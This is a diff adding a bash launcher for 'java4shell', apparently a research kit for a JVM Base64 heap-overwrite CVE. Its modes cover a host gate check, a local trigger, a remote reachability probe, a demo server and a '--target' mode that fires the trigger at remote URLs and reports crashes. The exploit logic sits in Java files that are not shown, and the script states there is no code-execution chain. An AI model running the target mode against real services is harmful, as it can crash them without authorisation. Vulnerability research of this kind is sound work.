@@ -1,0 +1,72 @@
+#!/usr/bin/env bash
+# java4shell - one entry point for the kit.
+#
+#   ./java4shell gate                          # can this host run the vulnerable path?
+#   ./java4shell selftest [iters]              # drive the vulnerable decode path locally
+#   ./java4shell probe --url URL               # does a remote app decode our Base64?
+#   ./java4shell --target https://host/path    # remote trigger run (auth/query/body)
+#   ./java4shell serve [port]                  # start the demo decode service locally
+#
+# What this kit is not: there is no RCE chain. The defect is a silent 64-byte heap
+# overwrite; converting it into control flow requires heap grooming inside the target
+# process, which is not implemented here. The --target mode drives the trigger and
+# reports the observable footprint (5xx / dropped connections = crash), nothing more.
+set -u
+DIR=$(cd "$(dirname "$0")" && pwd)
+cd "$DIR" || exit 1
+
+IMAGE=${JAVA4SHELL_IMAGE:-eclipse-temurin:17.0.21_9-jdk}
+
+run_java() {
+  if command -v java >/dev/null 2>&1; then
+    java "$@"
+  elif command -v docker >/dev/null 2>&1; then
+    echo "[java4shell] no local java - running in container $IMAGE" >&2
+    docker run --rm -v "$DIR:/r" -w /r "$IMAGE" java "$@"
+  else
+    echo "[java4shell] neither java nor docker found" >&2
+    exit 1
+  fi
+}
+
+cmd=${1:-help}
+[ $# -gt 0 ] && shift
+
+case "$cmd" in
+  gate)
+    exec bash "$DIR/tools/gate.sh"
+    ;;
+  selftest)
+    iters=${1:-100000}
+    echo "[java4shell] local reachability driver, $iters iterations"
+    run_java src/Base64Trigger.java "$iters"
+    ;;
+  probe)
+    run_java src/RemoteProbe.java "$@"
+    ;;
+  --target|attack)
+    [ "${1:-}" = "--target" ] && shift
+    run_java src/RemoteAttack.java --target "$@"
+    ;;
+  serve)
+    run_java src/DecodeServer.java "${1:-8080}"
+    ;;
+  *)
+    cat <<'EOF'
+java4shell - CVE-2026-114938 research kit
+
+  gate                        hardware + JVM gate check for every JDK on this host
+  selftest [iterations]       drive the vulnerable decode path locally
+  probe --url URL [--mode auth|query|body]
+                              does a remote app decode our Base64? (reachability only)
+  --target URL [--mode ...] [--param b] [--attempts N] [--shape control|padded|badtail]
+                              remote trigger run; reports status/latency/crash footprint
+  serve [port]                start the demo decode service (src/DecodeServer.java)
+
+Reality check: this kit proves reachability and heap corruption (local probe crashes the
+JVM 3/4 on an AVX-512 host). It does NOT contain a remote code execution chain: the
+64-byte overwrite lands in JVM heap and turning it into control needs heap grooming
+inside the target, which is not implemented. See docs/results.md.
+EOF
+    ;;
+esac
